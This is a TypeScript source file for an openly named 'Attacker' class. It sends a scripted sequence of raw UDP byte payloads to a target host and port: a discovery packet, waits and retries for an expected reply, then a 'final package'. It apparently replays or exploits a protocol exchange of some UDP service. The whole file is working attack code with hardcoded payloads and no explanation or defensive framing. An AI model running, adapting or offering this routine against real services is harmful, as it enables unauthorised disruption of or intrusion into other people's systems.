import * as dgram from "dgram";
import * as _ from "underscore";

const messageStage1 = [
	1, 2, 0, 42, 49, 127, 0, 0, 1, 0,
	0, 0, 0, 0, 0, 0, 0, 2, 0, 42,
	49, 127, 0, 0, 1, 0, 0, 0, 0, 0,
	0, 0, 0, 109, 44, 0, 0
];

const smallMessage = [3];

const messageStage2 = [
	5, 110, 115, 101, 217, 255, 196, 110, 72, 141, 124, 161,
	146, 49, 52, 114, 149, 16, 0, 1, 0, 40, 0, 0,
	0, 1, 9, 112, 114, 111, 102, 105, 108, 101, 49, 112,
	0, 0, 0, 0, 0, 81, 57, 68, 0, 74, 2, 65,
	8, 0, 0, 0, 0, 0, 0, 0, 0, 51, 1, 0,
	0, 18, 0, 0, 0
];

enum AttackType {
	Send = 1,
	Wait = 2
}

interface AttackStep {
	type: AttackType;
	message: number[];
	intervalMessage?: number[];
	comment: string;
}

const AttackRoutine: AttackStep[] = [
	{
		type: AttackType.Send,
		message: messageStage1,
		comment: "Discover"
	},
	{
		type: AttackType.Wait,
		message: smallMessage,
		intervalMessage: messageStage1,
		comment: "First wait"
	},
	{
		type: AttackType.Send,
		message: smallMessage,
		comment: "Send a small message"
	},
	/*{
		type: AttackType.Wait,
		message: smallMessage,
		intervalMessage: smallMessage,
		comment: "Second wait"
	},*/
	{
		type: AttackType.Send,
		message: messageStage2,
		comment: "Send final package"
	}
]
export class Attacker {
	address: string;
	port: number;
	timeout: number;
	socket: dgram.Socket;
	currentWait: (msg: Buffer, rinfo: any) => void;
	constructor(address: string, port: number, timeout: number) {
		this.address = address;
		this.port = port;
		this.timeout = timeout;
		this.currentWait = null;
	}
	sendMessage(message: number[]): Promise<any> {
		return new Promise(done => {
			this.socket.send(Buffer.from(message), done);
		});
	}
	waitForReply(messageToWait: number[], intervalMessage?: number[]): Promise<boolean> {
		let intv: NodeJS.Timeout = null;
		if (intervalMessage) {
			intv = setInterval(async () => {
				await this.sendMessage(intervalMessage);
			}, 500);
		}
		return new Promise(done => {
			this.currentWait = (msg: Buffer, rinfo: any) => {
				if (_.isEqual(msg.toJSON().data, messageToWait)) {
					if (intv) {
						clearInterval(intv);
					}
					this.currentWait = null;
					done(true);
				}
			};
			setTimeout(() => {
				if (!this.currentWait) {
					return;
				}
				if (intv) {
					clearInterval(intv);
				}
				this.currentWait = null;
				done(false);
			}, this.timeout);
		});
	}
	async performStep(step: AttackStep): Promise<string> {
		let err;
		switch (step.type) {
			case AttackType.Send: {
				err = await this.sendMessage(step.message);
				if (err) {
					return `Failed to perform step ${step.comment}: ${err.toString}`;
				}
				break;
			}
			case AttackType.Wait: {
				if (!await this.waitForReply(step.message, step.intervalMessage)) {
					return `Empty reply on step ${step.comment}.`;
				}
				break;
			}
			default: {
				return "Unknown step";
			}
		}
		return null;
	}
	async attack(): Promise<string> {
		this.socket = dgram.createSocket("udp4");
		let err: string = null;
		let connectionError: any = await new Promise(done => {
			this.socket.connect(this.port, this.address, done);
		});
		if (connectionError) {
			this.socket.close();
			return `Failed to connect: ${connectionError.toString()}`;
		}
		this.socket.on("message", (msg, rinfo) => {
			if (this.currentWait) {
				this.currentWait(msg, rinfo);
			}
		})
		for (let step of AttackRoutine) {
			err = await this.performStep(step);
			if (err) {
				break;
			}
		}
		this.socket.close();
		return err;
	}
}
